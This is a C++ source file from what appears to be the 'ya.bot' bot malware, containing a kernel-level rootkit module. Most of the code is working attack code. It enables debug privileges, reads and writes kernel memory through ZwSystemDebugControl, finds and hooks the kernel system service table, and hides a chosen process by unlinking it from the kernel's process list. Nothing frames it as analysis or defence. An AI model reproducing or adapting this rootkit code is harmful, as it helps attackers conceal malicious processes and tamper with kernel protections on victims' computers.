/*  ya.bot  */

#include "bot.h"

#ifndef NO_RING0

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original module by Andvare
//botbotbotbotbotbotbotbotbotbotbotbotbot

/*
HideProcess hp;
hp.hidePID(1337);

KernelHooks kh;
KernelHook f = kh.getKernelHook("ZwCreateProcess");
f.disable();
*/

#pragma comment(lib, "source\\libraries\\ring0.lib")

struct mem
{
	PVOID kernel_addr;
	PVOID user_addr;
	DWORD len;
};

KernelMemory::KernelMemory()
{
	HANDLE hToken;
		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	TOKEN_PRIVILEGES tok;
		tok.PrivilegeCount = 1;
		tok.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tok.Privileges[0].Luid);
		AdjustTokenPrivileges(hToken, FALSE, &tok, sizeof(tok), NULL, NULL);
}

DWORD KernelMemory::ReadMemWord(DWORD addr)
{
	DWORD m;
		ReadMem(addr, &m, 4);
		return m;
}

void KernelMemory::WriteMemWord(DWORD addr, DWORD data)
{
	 WriteMem(addr, &data, 4);
}

void KernelMemory::ReadMem(DWORD addr, PVOID data, DWORD size)
{
	struct mem mem;
		mem.kernel_addr = (PVOID)addr;
		mem.user_addr = data;
		mem.len = size;
		ZwSystemDebugControl(8, &mem, sizeof(mem), 0, 0, 0);
}

void KernelMemory::WriteMem(DWORD addr, PVOID data, DWORD size)
{
	struct mem mem;
		mem.kernel_addr = (PVOID)addr;
		mem.user_addr = data;
		mem.len = size;
		ZwSystemDebugControl(9, &mem, sizeof(mem), 0, 0, 0);
}

KernelHook::KernelHook(DWORD entryPointer, DWORD orgValue, DWORD newValue):
		entryPointer(entryPointer), orgValue(orgValue), newValue(newValue)
{
		km = new KernelMemory();
}

KernelHook::~KernelHook()
{
		delete km;
}

void KernelHook::enable()
{
		km->WriteMemWord(entryPointer,newValue);
}

void KernelHook::disable()
{
		km->WriteMemWord(entryPointer,orgValue);
}

class SysInfoData
{
	public:
		DWORD dwNumberOfModules;
		ULONG Reserved[2];
		PVOID Base;
		ULONG Size;
		ULONG Flags;
		USHORT Index;
		USHORT Unknown;
		USHORT LoadCount;
		USHORT ModuleNameOffset;
		CHAR ImageName[256];
};

struct RelocEntry
{
	WORD offset:12;
	WORD type:4;
};

#pragma pack(2)
struct MoveOp
{
	WORD opcode;
	DWORD opOne;
	DWORD opTwo;
};

DWORD KernelHooks::findServiceTable(HMODULE module, DWORD sdt)
{
	PIMAGE_NT_HEADERS inh = (IMAGE_NT_HEADERS *)((PCHAR)module +
			((IMAGE_DOS_HEADER *)module)->e_lfanew);
	PIMAGE_BASE_RELOCATION ibr = (IMAGE_BASE_RELOCATION *)((PCHAR)module +
			inh->OptionalHeader.DataDirectory[5].VirtualAddress);
	DWORD imageBase = inh->OptionalHeader.ImageBase;
	while(ibr->SizeOfBlock!=0)
	{
		unsigned int relocCount = (ibr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
		RelocEntry* relocEntry = (RelocEntry *)(ibr+1);
		for (unsigned int i = 0; i < relocCount; i++, relocEntry++)
		{
			if (relocEntry->type == IMAGE_REL_BASED_HIGHLOW)
			{
				MoveOp mo = *(MoveOp *)((DWORD)module +
						ibr->VirtualAddress + relocEntry->offset - 2);
				if ((mo.opOne-imageBase == sdt) && (mo.opcode == 0x05c7))
					return mo.opTwo-imageBase;
			}
		}
			ibr = (IMAGE_BASE_RELOCATION *)((char *)ibr + ibr->SizeOfBlock);
	}
		return 0;
}

void KernelHooks::getKernelInfo(DWORD *baseAddress, CHAR name[256])
{
	DWORD size = sizeof(SysInfoData);
	int rc = NtQuerySystemInformation(11, 0, 0, &size);
	char *rawsysinfo = new char[size];
		NtQuerySystemInformation(11, rawsysinfo,size, NULL);
	SysInfoData sysinfodata = *(SysInfoData*)rawsysinfo;
	delete rawsysinfo;
		*baseAddress = (DWORD)sysinfodata.Base;
		memcpy(name,
				sysinfodata.ModuleNameOffset + sysinfodata.ImageName,
				256 - sysinfodata.ModuleNameOffset);
}

KernelHook KernelHooks::getKernelHook(const char *functionName)
{
	HMODULE module = LoadLibrary(string_ring0ntdlllibrary);
	DWORD idx = (DWORD)*((char *)GetProcAddress(module,functionName) + 1);
	return KernelHook(table + idx * 4,orgFuncs[idx],km->ReadMemWord(table + idx * 4));
}

KernelHooks::KernelHooks()
{
		km = new KernelMemory();
	DWORD baseAddress;
	CHAR kernelName[256];
		getKernelInfo(&baseAddress, kernelName);
	HMODULE kernel = LoadLibraryEx(kernelName, 0, DONT_RESOLVE_DLL_REFERENCES);
	DWORD sdt = (DWORD)GetProcAddress(kernel, string_ring0keservicedescriptortablefunction) - (DWORD)kernel;
	DWORD sdBase = findServiceTable(kernel,sdt);
	DWORD functionCount = km->ReadMemWord(sdt + baseAddress + 8);
		orgFuncs = new DWORD[functionCount];
	DWORD lkernelBase = ((IMAGE_NT_HEADERS *)((PCHAR)kernel +
			((IMAGE_DOS_HEADER *)kernel)->e_lfanew))->OptionalHeader.ImageBase;
	for (DWORD i = 0; i < functionCount; i++)
			orgFuncs[i] = *(PDWORD)((PCHAR)kernel + sdBase + i * 4) + baseAddress - lkernelBase;
		table = km->ReadMemWord(sdt + baseAddress);
		FreeLibrary(kernel);
}

KernelHooks::~KernelHooks()
{
		delete km;
		delete[] orgFuncs;
}

void HideProcess::GetKernelInfo(DWORD *baseAddress, CHAR name[256])
{
	DWORD size = sizeof(SysInfoData);
	int rc = NtQuerySystemInformation(11, 0, 0, &size);
	char* rawsysinfo = new char[size];
		NtQuerySystemInformation(11, rawsysinfo,size, NULL);
	SysInfoData sysinfodata = *(SysInfoData *)rawsysinfo;
	delete rawsysinfo;
		*baseAddress = (DWORD)sysinfodata.Base;
		memcpy(name,
				sysinfodata.ModuleNameOffset + sysinfodata.ImageName,
				256 - sysinfodata.ModuleNameOffset);
}

void HideProcess::hidePID(DWORD pid)
{
	DWORD ep = systemProcess;
		flinkOffset = 0x88; //Hard coded for WinXP
		pidOffset = 0x84; //Hard coded for WinXP
	DWORD firstProc = km->ReadMemWord(ep + flinkOffset) - flinkOffset;
	DWORD secondProc = km->ReadMemWord(firstProc + flinkOffset) - flinkOffset;
	DWORD orgep = ep;
	do
	{
		DWORD priorep = ep;
			ep = km->ReadMemWord(ep + flinkOffset) - flinkOffset;
		DWORD nextep = km->ReadMemWord(ep + flinkOffset) - flinkOffset;
		if (km->ReadMemWord(ep + pidOffset) == pid)
		{
				km->WriteMemWord(priorep + flinkOffset, nextep + flinkOffset);
				km->WriteMemWord(nextep + flinkOffset + 4,priorep + flinkOffset);
				km->WriteMemWord(ep + flinkOffset, secondProc + flinkOffset);
				km->WriteMemWord(ep + flinkOffset + 4, firstProc + flinkOffset);
				break;
		}

	} while(orgep != ep);

}

HideProcess::HideProcess(void)
{
		km = new KernelMemory();
	DWORD baseAddress;
	CHAR kernelName[256];
		GetKernelInfo(&baseAddress, kernelName);
	HMODULE kernel = LoadLibrary(kernelName);
	DWORD initialSysProcess = (DWORD)GetProcAddress(kernel, string_ring0psinitialsystemprocessfunction);
		systemProcess = km->ReadMemWord(initialSysProcess - (DWORD)kernel + baseAddress);
		FreeLibrary(kernel);
}

HideProcess::~HideProcess(void)
{
		delete km;
}
#endif